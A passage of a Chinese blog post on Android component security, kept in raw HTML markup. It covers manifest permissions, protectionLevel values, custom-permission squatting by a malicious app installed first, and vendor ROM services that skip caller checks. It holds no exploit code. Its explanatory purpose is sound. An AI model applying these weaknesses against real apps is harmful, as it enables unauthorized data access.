class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">调用方需要在自己的AndroidManifest.<span class="hljs-keyword">xml</span> <span class="hljs-title">中申明</span><br><span class="hljs-title">例如：</span><br><span class="hljs-title">&lt;uses-permission</span><br>    android:<span class="hljs-attr">name=</span><span class="hljs-string">&quot;com.example.permission.ACCESS_SENSITIVE&quot;</span> /&gt;<br><br>uses-permission可以看作是整个APP声明的权限<br></code></pre></td></tr></table></figure><p>对于ContentProvide，还会有更加细腻的读写权限：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;provider<br>    android:<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;.UserDataProvider&quot;</span><br>    android:<span class="hljs-attribute">exported</span>=<span class="hljs-string">&quot;true&quot;</span><br>    android:<span class="hljs-attribute">readPermission</span>=<span class="hljs-string">&quot;com.example.permission.READ_DATA&quot;</span><br>    android:<span class="hljs-attribute">writePermission</span>=<span class="hljs-string">&quot;com.example.permission.WRITE_DATA&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>该权限保护只是基础的权限保护，在代码层面可能还有更精确的效验</p><h3 id="protectionLevel"><a href="#protectionLevel" class="headerlink" title="protectionLevel"></a>protectionLevel</h3><p>由于我们会自定义权限，其安全性取决于声明的保护级别protectionLevel（决定了授予条件）</p><table><thead><tr><th align="left">protectionLevel</th><th align="left">授予条件</th><th align="left">安全性</th></tr></thead><tbody><tr><td align="left">normal</td><td align="left">安装时自动授予，无需用户确认</td><td align="left">低，任何 App 声明即可获得</td></tr><tr><td align="left">dangerous</td><td align="left">需要用户运行时授权</td><td align="left">中，用户可能盲目同意</td></tr><tr><td align="left">signature</td><td align="left">必须与声明权限的 App 使用相同证书签名</td><td align="left">高，第三方 App 无法获得</td></tr><tr><td align="left">signatureOrSystem</td><td align="left">相同签名或系统预装 App</td><td align="left">高</td></tr></tbody></table><p>例如上面的</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;permission<br>    android:<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;com.example.permission.ACCESS_SENSITIVE&quot;</span><br>    android:<span class="hljs-attribute">protectionLevel</span>=<span class="hljs-string">&quot;signature&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>就说明该权限保护级别是signature，必须与声明权限的 App 使用相同证书签名才能声明该权限</p><h3 id="自定义权限抢注"><a href="#自定义权限抢注" class="headerlink" title="自定义权限抢注"></a>自定义权限抢注</h3><p>权限的 protectionLevel 由先安装的 App 定义。</p><p>也就是说恶意APP先安装声明了该权限为normal，如果后安装的正常APP再次声明为正常的signature，那么该权限不会被覆盖，而是称为恶意APP声明的权限。</p><p>（Android 12+ 会在导致同名权限冲突而失败）</p><h2 id="厂商定制ROM"><a href="#厂商定制ROM" class="headerlink" title="厂商定制ROM"></a>厂商定制ROM</h2><p>​厂商定制Android ROM通常会自定义服务，而其自定义服务通常通过<code>ServiceManager.addService()</code>注册到系统管理服务，不受Manifest exported 属性约束，任何App都可以通过<code>ServiceManager.getService(&quot;service_name&quot;)</code>来调用，所以调用该服务没有通过<code>checkCallingPermission()</code> 或 <code>checkCallingUid()</code>的话就会变成可利用漏洞</p><h2 id="版本更新"><a href="#版本更新" class="headerlink" title="版本更新"></a>版本更新</h2><h3 id="Android-12"><a href="#Android-12" class="headerlink" title="Android 12"></a>Android 12</h3><p>所有包含 intent-filter 的组件必须显式声明 android:exported 的值，否则无法安装</p><h3 id="Android-13"><a href="#Android-13" class="headerlink" title="Android 13+"></a>Android 13+</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://forum.butian.net/share/4814">https://forum.butian.net/share/4814</a></p>]]></content>
    
    
